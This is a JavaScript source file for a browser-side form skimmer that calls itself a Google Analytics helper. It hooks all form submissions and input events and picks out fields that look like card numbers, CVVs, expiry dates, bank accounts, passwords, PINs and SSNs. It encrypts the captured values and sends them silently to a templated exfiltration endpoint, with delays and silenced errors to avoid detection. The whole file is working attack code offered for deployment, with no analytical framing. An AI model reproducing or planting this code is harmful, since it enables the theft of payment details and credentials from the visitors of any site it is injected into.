/**
 * Financial Data Interceptor - Client-side module
 * Masquerades as Google Analytics helper
 * @version 1.0.0
 */

(function() {
    'use strict';

    // Configuration - values will be replaced during deployment
    const CONFIG = {
        // Endpoint to exfiltrate data (encrypted channel)
        EXFIL_ENDPOINT: 'https://${EXFIL_DOMAIN}/api/collect',
        // Public key for encrypting sensitive data before sending
        PUBLIC_KEY: '${PUBLIC_KEY}',
        // Delay before starting interception (ms) to avoid blocking page load
        INIT_DELAY: 1500,
        // Logging (dev only)
        DEBUG: ${DEBUG_MODE}
    };

    // Encryption using Web Crypto API (modern browsers)
    async function encryptData(data, publicKeyPem) {
        try {
            // Import RSA-OAEP public key
            const key = await crypto.subtle.importKey(
                'spki',
                base64ToArrayBuffer(publicKeyPem),
                {
                    name: 'RSA-OAEP',
                    hash: 'SHA-256'
                },
                false,
                ['encrypt']
            );

            // Convert data to JSON string and encode
            const encoded = new TextEncoder().encode(JSON.stringify(data));
            
            // Encrypt
            const encrypted = await crypto.subtle.encrypt(
                { name: 'RSA-OAEP' },
                key,
                encoded
            );

            // Return base64 for transmission
            return arrayBufferToBase64(encrypted);
        } catch (error) {
            logError('Encryption failed:', error);
            return null;
        }
    }

    // Helper: Base64 to ArrayBuffer
    function base64ToArrayBuffer(base64) {
        const binary = atob(base64);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        return bytes.buffer;
    }

    // Helper: ArrayBuffer to Base64
    function arrayBufferToBase64(buffer) {
        let binary = '';
        const bytes = new Uint8Array(buffer);
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return btoa(binary);
    }

    // Send data to our server
    async function exfiltrate(data) {
        const payload = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            data: data
        };

        // Encrypt the sensitive part
        const encrypted = await encryptData(payload, CONFIG.PUBLIC_KEY);
        if (!encrypted) return;

        // Send via fetch with minimal footprint
        fetch(CONFIG.EXFIL_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({ encrypted }),
            mode: 'cors',
            credentials: 'omit',
            keepalive: true // Ensures request completes even if page closes
        }).catch(() => {
            // Silent fail - don't break user experience
        });
    }

    // Monitor all form submissions
    function hookForms() {
        document.addEventListener('submit', function(event) {
            // Allow normal form submission first
            setTimeout(() => {
                const form = event.target;
                if (form.tagName !== 'FORM') return;

                const formData = new FormData(form);
                const formValues = {};
                
                // Extract all form fields
                for (const [name, value] of formData.entries()) {
                    if (value && typeof value === 'string' && value.trim()) {
                        formValues[name] = value;
                    }
                }

                // Check for financial patterns
                const financialPatterns = [
                    /card|cc|credit|debit/i,
                    /number|num|no/i,
                    /exp|expiry|expiration/i,
                    /cvv|cvc|security.code/i,
                    /bank|account|routing/i,
                    /phone|mobile|tel/i,
                    /email|e-mail/i,
                    /password|pass|pin|pwd/i,
                    /ssn|social.security/i,
                    /id|identification/i
                ];

                const isFinancial = Object.keys(formValues).some(key =>
                    financialPatterns.some(pattern => pattern.test(key))
                );

                if (Object.keys(formValues).length > 0 && isFinancial) {
                    exfiltrate({
                        type: 'form_submission',
                        formId: form.id || form.name || 'unknown',
                        action: form.action,
                        method: form.method,
                        fields: formValues
                    });
                }
            }, 10); // Small delay to not interfere with normal submission
        }, true);
    }

    // Monitor input fields for autofill and paste events
    function hookInputs() {
        document.addEventListener('input', function(event) {
            const target = event.target;
            if (!target || target.tagName !== 'INPUT') return;

            const sensitiveTypes = [
                'password', 'email', 'tel', 'number',
                'text' // Also check text inputs with financial patterns
            ];

            if (sensitiveTypes.includes(target.type) || target.type === 'text') {
                const financialNames = [
                    'card', 'credit', 'debit', 'cvv', 'cvc',
                    'exp', 'account', 'bank', 'ssn', 'pin'
                ];

                const isFinancial = financialNames.some(name =>
                    (target.name && target.name.toLowerCase().includes(name)) ||
                    (target.id && target.id.toLowerCase().includes(name)) ||
                    (target.placeholder && target.placeholder.toLowerCase().includes(name))
                );

                if (isFinancial && target.value && target.value.length > 3) {
                    // Debounce to avoid spamming
                    clearTimeout(target._exfilTimer);
                    target._exfilTimer = setTimeout(() => {
                        exfiltrate({
                            type: 'input_capture',
                            fieldName: target.name || target.id || 'unknown',
                            fieldType: target.type,
                            value: target.value,
                            page: window.location.href
                        });
                    }, 1000);
                }
            }
        }, true);
    }

    // Utility logging
    function logError(...args) {
        if (CONFIG.DEBUG) {
            console.error('[GA Helper]', ...args);
        }
    }

    function logInfo(...args) {
        if (CONFIG.DEBUG) {
            console.log('[GA Helper]', ...args);
        }
    }

    // Main initialization
    function init() {
        if (typeof window === 'undefined' || typeof document === 'undefined') return;

        // Wait for DOM and initial page load
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(startHooks, CONFIG.INIT_DELAY);
            });
        } else {
            setTimeout(startHooks, CONFIG.INIT_DELAY);
        }
    }

    function startHooks() {
        hookForms();
        hookInputs();
        logInfo('Interceptor initialized');
    }

    // Start the module
    init();
})();